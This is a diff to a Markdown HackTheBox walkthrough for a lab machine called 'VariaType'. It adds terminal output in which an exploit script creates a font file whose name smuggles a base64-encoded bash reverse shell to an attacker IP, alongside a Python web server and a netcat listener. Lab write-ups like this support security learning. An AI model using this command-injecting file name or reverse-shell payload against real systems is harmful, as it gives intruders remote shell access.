@@ -1850,6 +1850,15 @@ print(f"Created exploit.zip with filename: {exploit_filename}")
 - `python3 -m http.server 80`
     - **Description:** Python SimpleHTTPModule.
     - **Purpose:** Starts a temporary web server on port 80 to host the files in the current directory for the target to download.
+
+**Result:**
+
+```shell
+┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
+└─$ python3 exploit.py && python3 -m http.server 80
+Created exploit.zip with filename: $(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43MS80NDQ1IDA+JjE=|base64 -d|bash).ttf
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
 <div align="center">
 <br>
 <br>
@@ -1876,13 +1885,10 @@ On your Kali machine, start a listener: `nc -lvnp 4445`.
 
 **Result:**
 
-```
-
+```shell
 ┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
 └─$ nc -lvnp 4445                
 listening on [any] 4445 ...
-
-
 ```
 <div align="center">
 <br>
